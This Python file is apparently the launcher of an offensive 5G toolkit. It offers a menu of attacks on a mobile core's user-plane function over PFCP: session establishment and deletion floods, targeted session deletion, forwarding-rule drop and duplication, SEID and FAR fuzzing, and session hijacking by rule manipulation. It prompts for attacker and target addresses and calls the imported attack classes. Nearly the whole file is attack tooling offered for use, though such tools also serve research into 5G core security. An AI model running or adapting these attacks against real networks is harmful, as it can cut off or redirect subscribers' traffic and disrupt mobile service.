from pfcpDosAttack import PFCPDosAttack
from pfcpFuzzer import PFCPFuzzer
from pfcpHijack import PFCPHijack
from src import ip_list

DEST_PORT = 8805
SRC_PORT = 8805
NET_IFACE= "eth0"

########## UTILISATION PFCPToolkit

# # option 1: (mieux si on veut faire plusieurs requêtes sur le même upf)
# objet_test = PFCPToolkit(ip_list["EVIL"], ip_list["UPF"], SRC_PORT, DEST_PORT, verbose=True)
# objet_test.Send_PFCP_association_setup_req()
# objet_test.Send_PFCP_session_establishment_req(seid=0xC0FFEE, ue_addr="1.1.1.1")

# # option 2: (plus modulable)
# PFCPToolkit().Send_PFCP_association_setup_req(ip_list["EVIL"], ip_list["UPF"], SRC_PORT, DEST_PORT)
# PFCPToolkit().Send_PFCP_session_establishment_req(ip_list["EVIL"], ip_list["UPF"], SRC_PORT, DEST_PORT, 
#                                               seid=0xC0FFEE, ue_addr="1.1.1.1")



########## UTILISATION PFCPDosAttack

### SESSION ESTABLISHMENT FLOOD ATTACK (DoS)
# objet_dos = PFCPDosAttack(ip_list["EVIL"], ip_list["UPF"], SRC_PORT, DEST_PORT)
# objet_dos.set_verbose(True)
# objet_dos.set_randomize(True)

# objet_dos.set_random_far_number(int(sys.argv[3]))
# objet_dos.Start_pfcp_session_establishment_flood(reqNbr=int(sys.argv[1]), num_threads=int(sys.argv[2]))


### SESSION DELETION ATTACK (targeted DoS)
# objet_dos = PFCPDosAttack(ip_list["EVIL"], ip_list["UPF"], SRC_PORT, DEST_PORT)
# objet_dos.set_verbose(True)
# objet_dos.Start_pfcp_session_deletion_targeted(smf_addr=sys.argv[1], target_seid=int(sys.argv[2], 0))


### SESSION DELETION ATTACK (DoS)
# objet_dos = PFCPDosAttack(ip_list["EVIL"], ip_list["UPF"], SRC_PORT, DEST_PORT)
# objet_dos.set_verbose(True)
# objet_dos.Start_pfcp_session_deletion_bruteforce(reqNbr=int(sys.argv[1]), num_threads=int(sys.argv[2]))


def main():
    
    print("PFCPToolkit and PFCPDosAttack demo script")
    print("Coded with <3 by nxvertime")
    print("---------------------------------------\n")
    
    print("Choose an attack : ")
    print("==== PFCP DoS Attacks ====")
    print("[1]  PFCP Session Establishment Flood")
    print("[2]  PFCP Session Deletion Flood")
    print("[3]  PFCP Session Deletion Targeted")
    print("[4]  PFCP Session Modification FAR Drop")
    print("[5]  PFCP Session Modification FAR Duplication")
    
    print("==== PFCP Discovery Attacks ====")
    print("[6]  PFCP SEID Fuzzing")
    print("[7]  PFCP FAR Fuzzing")
    
    print("==== PFCP Hijack Attacks ====")
    print("[8]  PFCP Hijack by FAR Manipulation")
    
    usr_input = input("# ")
    choice = None
    try:
        choice = int(usr_input)
    except ValueError:
        print("Invalid input. Please enter a number.")
        return
    
    if choice == 1:
        print("PFCP Session Establishment Flood selected")
        
        print(f"Enter your IP address (evil_addr) [default: {ip_list["EVIL"]}]: ")
        evil_addr = input("# ") or ip_list["EVIL"]
        print(f"Enter the UPF address (upf_addr) [default: {ip_list["UPF"]}]: ")
        upf_addr = input("# ") or ip_list["UPF"]
        print(f"Enter the source port (src_port) [default: {SRC_PORT}]: ")
        src_port = int(input("# ") or SRC_PORT)
        print(f"Enter the destination port (dest_port) [default: {DEST_PORT}]: ")
        dest_port = int(input("# ") or DEST_PORT)
        
        print("Number of requests: ")
        reqNbr = int(input("# "))
        print("Number of threads: ")
        num_threads = int(input("# "))
        print("Random FAR number (0 to disable): ")
        random_far_number = int(input("# "))
        
        dos_obj = PFCPDosAttack(evil_addr, upf_addr, src_port, dest_port, verbose=True)
        dos_obj.set_random_far_number(random_far_number)

        dos_obj.Start_pfcp_session_establishment_flood(reqNbr=reqNbr, num_threads=num_threads)
        
    if choice == 2:
        print("PFCP Session Deletion Flood selected")
        
        print(f"Enter your IP address (evil_addr) [default: {ip_list["EVIL"]}]: ")
        evil_addr = input("# ") or ip_list["EVIL"]
        print(f"Enter the UPF address (upf_addr) [default: {ip_list["UPF"]}]: ")
        upf_addr = input("# ") or ip_list["UPF"]
        print(f"Enter the source port (src_port) [default: {SRC_PORT}]: ")
        src_port = int(input("# ") or SRC_PORT)
        print(f"Enter the destination port (dest_port) [default: {DEST_PORT}]: ")
        dest_port = int(input("# ") or DEST_PORT)
        
        print("Number of requests: ")
        reqNbr = int(input("# "))
        print("Number of threads: ")
        num_threads = int(input("# "))
        
        dos_obj = PFCPDosAttack(evil_addr, upf_addr, src_port, dest_port, verbose=True)
        dos_obj.Start_pfcp_session_deletion_bruteforce(reqNbr=reqNbr, num_threads=num_threads)

    if choice == 3:
        print("PFCP Session Deletion Targeted selected")
        
        print(f"Enter your IP address (evil_addr) [default: {ip_list["EVIL"]}]: ")
        evil_addr = input("# ") or ip_list["EVIL"]
        print(f"Enter the UPF address (upf_addr) [default: {ip_list["UPF"]}]: ")
        upf_addr = input("# ") or ip_list["UPF"]
        print(f"Enter the source port (src_port) [default: {SRC_PORT}]: ")
        src_port = int(input("# ") or SRC_PORT)
        print(f"Enter the destination port (dest_port) [default: {DEST_PORT}]: ")
        dest_port = int(input("# ") or DEST_PORT)
        
        print("SEID to delete (in hex): ")
        target_seid = int(input("# "), 0)
        
        dos_obj = PFCPDosAttack(evil_addr, upf_addr, src_port, dest_port, verbose=True)
        dos_obj.Start_pfcp_session_deletion_targeted(target_seid=target_seid, smf_addr=evil_addr)
    
    if choice == 4:
        print("PFCP Session Modification FAR Drop selected")
        
        print(f"Enter your IP address (evil_addr) [default: {ip_list["EVIL"]}]: ")
        evil_addr = input("# ") or ip_list["EVIL"]
        print(f"Enter the UPF address (upf_addr) [default: {ip_list["UPF"]}]: ")
        upf_addr = input("# ") or ip_list["UPF"]
        print(f"Enter the source port (src_port) [default: {SRC_PORT}]: ")
        src_port = int(input("# ") or SRC_PORT)
        print(f"Enter the destination port (dest_port) [default: {DEST_PORT}]: ")
        dest_port = int(input("# ") or DEST_PORT)
        
        print("Enter the FAR range: ")
        far_range = int(input("# "))
        print("Enter the Session range: ")
        session_range = int(input("# "))
        
        dos_obj = PFCPDosAttack(evil_addr, upf_addr, src_port, dest_port, verbose=True)
        dos_obj.Start_pfcp_session_modification_far_drop_bruteforce(far_range=far_range, session_range=session_range)
        
        
    if choice == 5:
        print("PFCP Session Modification FAR Duplication selected")
        
        print(f"Enter your IP address (evil_addr) [default: {ip_list["EVIL"]}]: ")
        evil_addr = input("# ") or ip_list["EVIL"]
        print(f"Enter the UPF address (upf_addr) [default: {ip_list["UPF"]}]: ")
        upf_addr = input("# ") or ip_list["UPF"]
        print(f"Enter the source port (src_port) [default: {SRC_PORT}]: ")
        src_port = int(input("# ") or SRC_PORT)
        print(f"Enter the destination port (dest_port) [default: {DEST_PORT}]: ")
        dest_port = int(input("# ") or DEST_PORT)
        
        print("Enter the FAR range: ")
        far_range = int(input("# "))
        print("Enter the Session range: ")
        session_range = int(input("# "))
        
        dos_obj = PFCPDosAttack(verbose=True)
        dos_obj.Start_pfcp_session_modification_far_dupl_bruteforce(
            far_range=far_range, 
            session_range=session_range,
            evil_addr=evil_addr,
            upf_addr=upf_addr,
            src_port=src_port,
            dest_port=dest_port
        )
    if choice == 6:
        print("PFCP SEID Fuzzing selected")
        
        print(f"Enter your IP address (evil_addr) [default: {ip_list["EVIL"]}]: ")
        evil_addr = input("# ") or ip_list["EVIL"]
        print(f"Enter the UPF address (upf_addr) [default: {ip_list["UPF"]}]: ")
        upf_addr = input("# ") or ip_list["UPF"]
        print(f"Enter the source port (src_port) [default: {SRC_PORT}]: ")
        src_port = int(input("# ") or SRC_PORT)
        print(f"Enter the destination port (dest_port) [default: {DEST_PORT}]: ")
        dest_port = int(input("# ") or DEST_PORT)
        
        print("Max SEID to fuzz: ")
        max_seid = int(input("# "))
        
        print("Max FAR to discover (in cases where FARs are not incremented): ")
        max_far_discover = int(input("# "))
        
        fuzzer_obj = PFCPFuzzer()
        fuzzer_obj.set_verbose(True)
        fuzzer_obj.Start_PFCP_SEID_fuzzing(
            upf_addr=upf_addr,
            src_addr=evil_addr,
            max_seid=max_seid,
            max_far_discover=max_far_discover,
            src_port=src_port,
            dest_port=dest_port
        )
    if choice == 7:
        print("PFCP FAR Fuzzing selected")
        
        print(f"Enter your IP address (evil_addr) [default: {ip_list["EVIL"]}]: ")
        evil_addr = input("# ") or ip_list["EVIL"]
        print(f"Enter the UPF address (upf_addr) [default: {ip_list["UPF"]}]: ")
        upf_addr = input("# ") or ip_list["UPF"]
        print(f"Enter the source port (src_port) [default: {SRC_PORT}]: ")
        src_port = int(input("# ") or SRC_PORT)
        print(f"Enter the destination port (dest_port) [default: {DEST_PORT}]: ")
        dest_port = int(input("# ") or DEST_PORT)
        
        print("Max SEID to fuzz: ")
        max_seid = int(input("# "))
        print("Max FAR to discover: ")
        max_far_discover = int(input("# "))
        
        fuzzer_obj = PFCPFuzzer()
        fuzzer_obj.set_verbose(True)
        fuzzer_obj.Start_PFCP_FARID_fuzzing(
            upf_addr=upf_addr,
            src_addr=evil_addr,
            max_seid=max_seid,
            max_far_discover=max_far_discover,
            src_port=src_port,
            dest_port=dest_port
        )
    if choice == 8:
        print("PFCP Hijack by FAR Manipulation selected")
        
        print(f"Enter your IP address (hijacker_addr) [default: {ip_list["EVIL"]}]: ")
        hijacker_addr = input("# ") or ip_list["EVIL"]
        print(f"Enter the UPF address (upf_addr) [default: {ip_list["UPF"]}]: ")
        upf_addr = input("# ") or ip_list["UPF"]
        print(f"Enter the source port (src_port) [default: {SRC_PORT}]: ")
        src_port = int(input("# ") or SRC_PORT)
        print(f"Enter the destination port (dest_port) [default: {DEST_PORT}]: ")
        dest_port = int(input("# ") or DEST_PORT)
        
        print("SEID to fuzz: ")
        seid = int(input("# "))
        
        hijack_obj = PFCPHijack()
        hijack_obj.set_verbose(True)
        hijack_obj.Start_PFCP_hijack_far_manipulation(
            hijacker_addr=hijacker_addr,
            upf_addr=upf_addr,
            src_port=src_port,
            dest_port=dest_port,
            seid=seid
        )



if __name__ == "__main__":
    main()
    
    